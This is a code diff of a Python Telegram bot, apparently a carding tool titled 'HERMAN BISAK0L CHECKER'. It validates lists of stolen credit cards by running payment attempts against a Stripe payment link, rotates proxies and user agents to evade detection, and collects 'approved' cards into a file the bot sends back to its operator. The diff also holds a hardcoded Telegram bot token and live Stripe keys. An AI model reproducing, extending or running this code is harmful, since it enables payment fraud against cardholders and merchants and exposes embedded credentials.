@@ -1,5 +1,4 @@
 import requests
-import sys
 import os
 import time
 import concurrent.futures
@@ -11,13 +10,11 @@ import string
 import urllib.parse
 from telebot import TeleBot, types
 from functools import partial
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
 
-if sys.platform == 'win32':
-    os.system('chcp 65001 > nul')
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+if not BOT_TOKEN:
+    BOT_TOKEN = "8675963323:AAFdOHR_-qhX_TPTOOESKOWWbg6ToEhIm50"
 
-BOT_TOKEN = "8675963323:AAFdOHR_-qhX_TPTOOESKOWWbg6ToEhIm50"
 bot = TeleBot(BOT_TOKEN)
 
 BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
@@ -35,7 +32,6 @@ BRAND_ICON = '→ Brand →'
 BANK_ICON = '→ Bank →'
 COUNTRY_ICON = '→ Country →'
 DEV_ICON = '→ Dev →'
-
 STATUS_EMOJI = {"CHARGED": "🔥", "APPROVED": "✅", "DECLINED": "❌", "ERROR": "⚠️"}
 
 USER_AGENTS = [
@@ -100,7 +96,6 @@ def decline_message(code, default_msg):
     mapping = {"incorrect_cvc": "Your security code is incorrect", "incorrect_number": "Your card number is incorrect.", "insufficient_funds": "Your card has insufficient funds."}
     return mapping.get(code, default_msg)
 
-# ================== FULL CHECK_CC FROM stripedaw.py ==================
 def check_cc(cc_full, proxy=None, proxy_type="http"):
     session = requests.Session()
     if proxy:
@@ -112,9 +107,7 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
         name = data_parts[4].strip() if len(data_parts) > 4 else "Card Holder"
     except:
         return "ERROR", "Invalid format", "UNKNOWN"
-
     email = generate_random_email()
-
     try:
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -129,14 +122,12 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
         }
         session.get(BUY_URL, headers=headers, timeout=20)
         html = session.get(BUY_URL, headers=headers, timeout=20).text
-
         pk_live = None
         m = re.search(r"pk_live_[A-Za-z0-9]+", html)
         if m: pk_live = m.group(0)
         cs_id = None
         m = re.search(r"cs_live_[A-Za-z0-9]+", html)
         if m: cs_id = m.group(0)
-
         merchant_ui_headers = {
             "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
             "content-type": "application/x-www-form-urlencoded",
@@ -155,7 +146,6 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
             f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
             headers=merchant_ui_headers, data=urllib.parse.urlencode(payment_link_form), timeout=20
         )
-
         checkout_session_id = cs_id
         pl_data = {}
         pl_expected_amount = None
@@ -173,18 +163,15 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
                     pl_expected_amount = int(pl_expected_amount)
             except:
                 pass
-
         if not pk_live:
             pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
         if not checkout_session_id:
             checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"
-
         muid = "bf10e066-3dde-43cf-990c-7f526e267148"
         guid = "598209cc-46fa-4e08-b69c-22b3316aba05"
         sid = "4318288f-e6f2-4e62-bc88-4d5ccc435a1b"
         stripe_js_id = str(uuid.uuid4())
         currency = pl_currency
-
         api_headers = {
             "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
             "content-type": "application/x-www-form-urlencoded",
@@ -195,7 +182,6 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
             "user-agent": random.choice(USER_AGENTS),
         }
-
         elements_sessions_params = {
             "client_betas[0]": "google_pay_beta_1",
             "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
@@ -222,9 +208,7 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
             expected_amount_cents = 100
         expected_amount_cents = int(expected_amount_cents)
         expected_amount_str = str(expected_amount_cents)
-
         buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}
-
         form_pm = {
             "type": "card",
             "card[number]": cc, "card[cvc]": cvv,
@@ -251,12 +235,10 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
         pm_id = pm_resp.get("id")
         if not pm_id:
             return "ERROR", "Failed to create PaymentMethod", "UNKNOWN"
-
         init_checksum = _rand_id(32)
         js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "\~^=[]|%#{}<>?`", k=50))
         pxvid = str(uuid.uuid4())
         rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))
-
         confirm_form = {
             "eid": "NA", "payment_method": pm_id,
             "expected_amount": expected_amount_str,
@@ -284,12 +266,9 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
             headers=buy_headers, data=urllib.parse.urlencode(confirm_form, safe=""), timeout=20
         )
         data = confirm_resp.json()
-
         brand = data.get("payment_method", {}).get("card", {}).get("brand", "UNKNOWN")
-
         if confirm_resp.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
             return "APPROVED", "3DS Required", brand
-
         err = data.get("error") or {}
         if err:
             err_code = err.get("code", "")
@@ -299,15 +278,37 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
             if err_code == "insufficient_funds":
                 return "APPROVED", decline_message(err_code, message), brand
             return "DECLINED", decline_message(err_code, message), brand
-
         if data.get("status") in ("succeeded", "complete"):
             return "CHARGED", "Your card was charged.", brand
-
         return "DECLINED", "Unknown response", brand
     except requests.exceptions.RequestException as e:
         return "ERROR", f"Request failed: {str(e)[:150]}", "UNKNOWN"
     except Exception as e:
         return "ERROR", f"Gateway Error: {str(e)[:150]}", "UNKNOWN"
+
+def save_approved_list(cc_line):
+    try:
+        parts = cc_line.strip().split('|')
+        clean = '|'.join(parts[:4])
+        with open("approved_cards.txt", "a", encoding="utf-8") as f:
+            f.write(clean + "\n")
+    except:
+        pass
+
+def build_final_approved_file():
+    try:
+        if os.path.exists("approved_cards.txt"):
+            with open("approved_cards.txt", "r", encoding="utf-8") as f:
+                lines = f.readlines()
+            seen = {}
+            unique = [line.strip() for line in lines if line.strip() and line.strip() not in seen and not seen.update({line.strip(): True})]
+            with open("approved_cards.txt", "w", encoding="utf-8") as f:
+                for card in unique:
+                    f.write(card + "\n")
+            return len(unique)
+    except:
+        pass
+    return 0
 
 def build_block(cc_line, status, response, brand, bank, country, flag):
     emoji = STATUS_EMOJI.get(status, "")
@@ -327,10 +328,6 @@ def save_result(block, status):
         with open(f"{status.lower()}.txt", "a", encoding="utf-8") as f:
             f.write(block + "\n\n")
 
-def save_approved_list(cc_line):
-    with open("approved_list.txt", "a", encoding="utf-8") as f:
-        f.write(cc_line + "\n")
-
 def clean_declined_files():
     for f in ["declined.txt", "error.txt"]:
         if os.path.exists(f):
@@ -341,47 +338,51 @@ def clean_declined_files():
 
 def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
     attempt = 0
-    while True:
+    while attempt < 3:
         attempt += 1
-        proxy = None
-        if use_proxy and proxies_list:
-            with proxy_lock:
-                proxy = random.choice(proxies_list)
+        proxy = random.choice(proxies_list) if use_proxy and proxies_list else None
         status, response, brand_auto = check_cc(cc_line, proxy, proxy_type)
         if status in ["CHARGED", "APPROVED", "DECLINED"]:
             break
         time.sleep(random.uniform(0.8, 2.0))
-
     bin_code = cc_line[:6]
     brand_bin, bank, country, flag = get_bin_info(bin_code)
     brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
-
     if status == "CHARGED": stats["charged"] += 1
     elif status == "APPROVED": stats["approved"] += 1
     elif status == "ERROR": stats["error"] += 1
     else: stats["declined"] += 1
-
     block = build_block(cc_line, status, response, brand, bank, country, flag)
-
     if chat_id:
         try:
-            bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')} (Try {attempt})\n{response}", parse_mode='Markdown')
+            bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')}", parse_mode='Markdown')
             if status in ["CHARGED", "APPROVED"]:
                 bot.send_message(chat_id, f"```{block}```", parse_mode='Markdown')
         except:
             pass
-
     if status in ["CHARGED", "APPROVED"]:
         save_result(block, status)
-        clean_cc = '|'.join(cc_line.split('|')[:4])
-        save_approved_list(clean_cc)
+        save_approved_list(cc_line)
 
 @bot.message_handler(commands=['start'])
 def start(msg):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row('🔹 SINGLE CHECK', '🔹 MASS CHECK')
-    markup.row('📊 STATUS', '❌ STOP')
+    markup.row('📊 STATUS', '📋 APPROVED LIST')
+    markup.row('❌ STOP')
     bot.send_message(msg.chat.id, "🟢 **HERMAN BISAK0L CHECKER** Andam na\n**Option 6 = PASAS KAAYO KAAYO Proxies**", reply_markup=markup, parse_mode='Markdown')
+
+@bot.message_handler(commands=['approved'])
+def send_approved_list(msg):
+    count = build_final_approved_file()
+    try:
+        if os.path.exists("approved_cards.txt") and os.path.getsize("approved_cards.txt") > 0:
+            with open("approved_cards.txt", "rb") as f:
+                bot.send_document(msg.chat.id, f, caption=f"✅ **Final Approved Cards**\nTotal: {count} cards\nFormat: number|mm|yy|cvv")
+        else:
+            bot.send_message(msg.chat.id, "No approved cards yet.")
+    except:
+        bot.send_message(msg.chat.id, "Error sending file.")
 
 @bot.message_handler(func=lambda m: True)
 def handle_text(msg):
@@ -394,6 +395,10 @@ def handle_text(msg):
         bot.register_next_step_handler(msg, mass_check_paste)
     elif text == '📊 STATUS':
         bot.send_message(msg.chat.id, f"**Stats**\nCharged: {stats['charged']}\nApproved: {stats['approved']}\nDeclined: {stats['declined']}\nError: {stats['error']}", parse_mode='Markdown')
+    elif text == '📋 APPROVED LIST':
+        send_approved_list(msg)
+    elif text == '❌ STOP':
+        bot.send_message(msg.chat.id, "Bot stopped.")
 
 def single_check(msg):
     cc = msg.text.strip()
@@ -406,15 +411,15 @@ def single_check(msg):
     bot.send_message(msg.chat.id, f"```{block}```", parse_mode='Markdown')
     if status in ["CHARGED", "APPROVED"]:
         save_result(block, status)
+        save_approved_list(cc)
 
 def mass_check_paste(msg):
     lines = [line.strip() for line in msg.text.splitlines() if line.strip() and '|' in line]
-    ccs = lines
-    if not ccs:
+    if not lines:
         bot.send_message(msg.chat.id, "Walay valid nga cards.")
         return
-    bot.send_message(msg.chat.id, f"Nakarga {len(ccs)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
-    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, ccs))
+    bot.send_message(msg.chat.id, f"Nakarga {len(lines)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
+    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, lines))
 
 def mass_proxy_choice(msg, ccs):
     ch = msg.text.strip()
@@ -452,5 +457,5 @@ Approved: {stats['approved']}
 Declined & Error: gidelete na""")
 
 if __name__ == "__main__":
-    print("HERMAN BISAK0L CHECKER - PASAS KAAYO KAAYO AUTO PROXIES")
-    bot.infinity_polling()
+    print("HERMAN BISAK0L CHECKER - Running 24/7")
+    bot.infinity_polling(none_stop=True, interval=0, timeout=20)
